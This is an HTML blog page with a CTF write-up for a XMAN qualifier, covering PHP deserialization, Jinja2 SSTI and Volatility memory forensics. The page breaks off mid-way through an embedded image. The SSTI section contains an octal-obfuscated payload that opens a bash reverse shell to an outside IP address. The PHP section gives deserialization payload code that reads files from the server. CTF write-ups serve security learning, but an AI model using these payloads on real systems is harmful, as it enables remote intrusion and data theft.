@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang=zh-TW>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Web簽到按照提示進行請求即可獲得 flag。 123456POST &#x2F;?a&#x3D;1 HTTP&#x2F;1.1Host: 124.71.236.172Content-Length: 3Connection: closeb&#x3D;2  1flag&amp;#123;you_are_great!!!&amp;#125;  easyphp題目給出的程式碼如下。 12345678910111213141516171819202122232">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第五屆 XMAN 選拔賽">
+<meta property="og:url" content="https://lemonprefect.cn/zh-TW/posts/7b00520f.html">
+<meta property="og:site_name" content="Hexagon">
+<meta property="og:description" content="Web簽到按照提示進行請求即可獲得 flag。 123456POST &#x2F;?a&#x3D;1 HTTP&#x2F;1.1Host: 124.71.236.172Content-Length: 3Connection: closeb&#x3D;2  1flag&amp;#123;you_are_great!!!&amp;#125;  easyphp題目給出的程式碼如下。 12345678910111213141516171819202122232">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/f88da837-3d50-4191-b2d6-8c0874735dfa/1628227223003208/fb88be86ff538bf5e307a88e601664e12f84be03.jpg">
+<meta property="article:published_time" content="2021-08-06T12:50:00.000Z">
+<meta property="article:modified_time" content="2021-08-06T12:57:09.658Z">
+<meta property="article:author" content="LemonPrefect">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://api.lemonprefect.cn/image/hdslb/archive/f88da837-3d50-4191-b2d6-8c0874735dfa/1628227223003208/fb88be86ff538bf5e307a88e601664e12f84be03.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/avatar.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>第五屆 XMAN 選拔賽</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        <!-- 
+        <li><a class="icon" aria-label="上一篇 " href="/zh-CN/posts/7b00520f.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/zh-CN/posts/603682ab.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        --!>
+
+        
+          
+          
+          
+            <li><a class="icon" aria-label="中文简体（大陆标准） " href="/zh-CN/posts/7b00520f.html">简</a></li>
+          
+            <li><a class="icon" aria-label="正体中文（台灣標準） " href="#">正</a></li>
+          
+        
+
+        <li><a class="icon" aria-label="回到頁首 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
+        <li><a class="icon" aria-label="分享 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到頁首</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/7b00520f.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/7b00520f.html&text=第五屆 XMAN 選拔賽"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/7b00520f.html&title=第五屆 XMAN 選拔賽"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/7b00520f.html&is_video=false&description=第五屆 XMAN 選拔賽"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=第五屆 XMAN 選拔賽&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/7b00520f.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/7b00520f.html&title=第五屆 XMAN 選拔賽"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/7b00520f.html&title=第五屆 XMAN 選拔賽"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/7b00520f.html&title=第五屆 XMAN 選拔賽"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/7b00520f.html&title=第五屆 XMAN 選拔賽"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/7b00520f.html&name=第五屆 XMAN 選拔賽&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/7b00520f.html&t=第五屆 XMAN 選拔賽"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B0%BD%E5%88%B0"><span class="toc-number">1.1.</span> <span class="toc-text">簽到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyphp"><span class="toc-number">1.2.</span> <span class="toc-text">easyphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyssti"><span class="toc-number">1.3.</span> <span class="toc-text">easyssti</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#try-all-volatility"><span class="toc-number">2.1.</span> <span class="toc-text">try_all_volatility</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        第五屆 XMAN 選拔賽
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LemonPrefect</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-08-06T12:50:00.000Z" itemprop="datePublished">2021-08-06</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="簽到"><a href="#簽到" class="headerlink" title="簽到"></a>簽到</h3><p>按照提示進行請求即可獲得 flag。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?a=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.71.236.172</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">b=2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;you_are_great!!!&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>題目給出的程式碼如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;Hel&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;xctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> Filter;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;what?Really?&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hel</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;Hello bro, I guess you are a lazy &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Filter</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xctf&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;xctf&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> XMAN;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>觀察到有對 <code>valid</code> 方法的呼叫，因此嘗試使用 FilesystemIterator 類列出目錄下檔案，再使用 SplFileObject 讀取出 flag。構造出如下兩段指令碼生成載荷。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// List directory</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;FilesystemIterator&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;./xxxXXXmMManNNn&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> XMAN());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read flag</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;./xxxXXXmMManNNn/f1a4.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> XMAN());</span><br></pre></td></tr></table></figure>
+
+<p>將生成的載荷作為 GET 引數 <code>xctf</code> 提交即可獲得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;928erf51ab894a64f7865cf3c2128b34&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="easyssti"><a href="#easyssti" class="headerlink" title="easyssti"></a>easyssti</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/223895#:~:text=Web-,Normal%20ssti,-ban%E4%BA%86%E5%BE%88%E5%A4%9A">https://www.anquanke.com/post/id/223895#:~:text=Web-,Normal%20ssti,-ban%E4%BA%86%E5%BE%88%E5%A4%9A</a></p>
+</blockquote>
+<p>跟 2020 年的安洵杯的 Normal ssti 相似，也是 Jinja2 的模板注入。不同點在於很難拿到 getitem 方法，因此可以使用 values 方法將字典轉化為陣列再取值。使用八進位制繞過，構造出如下載荷進行反彈 shell。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#123;%print((lipsum|attr(&quot;__globals__&quot;)).values()[18].values()[134](&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\142\141\163\150\40\55\143\40\42\142\141\163\150\40\55\151\40\76\46\40\57\144\145\166\57\164\143\160\57\70\56\61\63\66\56\70\56\62\61\60\57\63\62\65\65\40\60\76\46\61\42\47\51\56\162\145\141\144\50\51&quot;))%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在靶機的根目錄可以找到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;zPkb3tzUW8m0KuSfPoPqgSU37I4ui2hZ&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="try-all-volatility"><a href="#try-all-volatility" class="headerlink" title="try_all_volatility"></a>try_all_volatility</h3><blockquote>
+<p>我從孫吉兒那裡偷來資料，但他是個機靈鬼，竟然把flag藏到了自拍照裡</p>
+</blockquote>
+<p>將檔案解壓後使用 Volatility 2 的 imageinfo 檢測，可以得到如下如下資訊。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)</span><br><span class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (&#x2F;mnt&#x2F;f&#x2F;ghrepos&#x2F;volatility2&#x2F;imgs&#x2F;mem)</span><br><span class="line">                      PAE type : PAE</span><br><span class="line">                           DTB : 0x713000L</span><br><span class="line">                          KDBG : 0x8054e2e0L</span><br><span class="line">          Number of Processors : 2</span><br><span class="line">     Image Type (Service Pack) : 3</span><br><span class="line">                KPCR for CPU 0 : 0xffdff000L</span><br><span class="line">                KPCR for CPU 1 : 0xbab40000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xffdf0000L</span><br><span class="line">           Image date and time : 2021-06-18 02:13:15 UTC+0000</span><br><span class="line">     Image local date and time : 2021-06-18 10:13:15 +0800</span><br></pre></td></tr></table></figure>
+
+<p>確定 profile 為 WinXPSP3x86 後可以使用 filescan 掃描到桌面有兩個關鍵檔案。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">0x0000000009aaf028      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\MISC\hint.txt</span><br><span class="line">0x000000000a283498      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\MISC\res.png</span><br></pre></td></tr></table></figure>
+
+<p>將文字文件和圖片提取出來，在 hint.txt 中可以得到如下提示。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">youcangetsthfromcmd</span><br></pre></td></tr></table></figure>
+
+<p>使用 cmdscan 功能可以得到如下資訊。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">**************************************************</span><br><span class="line">CommandProcess: csrss.exe Pid: 600</span><br><span class="line">CommandHistory: 0x2e3a508 Application: cmd.exe Flags: Allocated, Reset</span><br><span class="line">CommandCount: 18 LastAdded: 17 LastDisplayed: 17</span><br><span class="line">FirstCommand: 0 CommandCountMax: 50</span><br><span class="line">ProcessHandle: 0x198</span><br><span class="line">Cmd #0 @ 0x55b548: cd C:\Documents and Settings\Administrator\??\MISC</span><br><span class="line">Cmd #1 @ 0x2dd7a20: winpmem_v3.3.rc3.exe -dd -o memdump.raw --format --volume_format raw</span><br><span class="line">Cmd #2 @ 0x55b8a8: winpmem_v3.3.rc3.exe -dd -o memdump.raw --format raw  --volume_format raw</span><br><span class="line">Cmd #3 @ 0x55b3f0: can you find this?</span><br><span class="line">Cmd #4 @ 0x5524b8: yes</span><br><span class="line">Cmd #5 @ 0x2e39400: please go on</span><br><span class="line">Cmd #6 @ 0x2e39a80: haha</span><br><span class="line">Cmd #7 @ 0x2e01170: flag is down</span><br><span class="line">Cmd #8 @ 0x2e02110: flag&#123;xixixixix_Llalala_leizeNiuBi&#125;</span><br><span class="line">Cmd #9 @ 0x2e02f60: winpmem_v3.3.rc3.exe -dd -o memdump.raw --format raw  --volume_format raw</span><br><span class="line">Cmd #10 @ 0x2e3a130: waw</span><br><span class="line">Cmd #11 @ 0x2e3a1d8: jpg?????????????????????????????????????????????????</span><br><span class="line">Cmd #12 @ 0x2e3dd80: ?</span><br><span class="line">Cmd #13 @ 0x55b878: nonono it is png</span><br><span class="line">Cmd #14 @ 0x55c778: just check the pixel!</span><br><span class="line">Cmd #15 @ 0x55d1d8: !!!!!!!</span><br><span class="line">Cmd #16 @ 0x2e3a028: !!!!!!</span><br><span class="line">Cmd #17 @ 0x2dd7ad0: winpmem_v3.3.rc3.exe -dd -o memorydump.raw --format raw --volume_format raw</span><br><span class="line">**************************************************</span><br><span class="line">CommandProcess: csrss.exe Pid: 600</span><br><span class="line">CommandHistory: 0x2e3ad88 Application: winpmem_v3.3.rc3.exe Flags: Allocated</span><br><span class="line">CommandCount: 0 LastAdded: -1 LastDisplayed: -1</span><br><span class="line">FirstCommand: 0 CommandCountMax: 50</span><br><span class="line">ProcessHandle: 0x624</span><br></pre></td></tr></table></figure>
+
+<p>對圖片使用 StegSolve 進行 B 通道下的 MSB 資料提取可以得到一個壓縮包。</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27O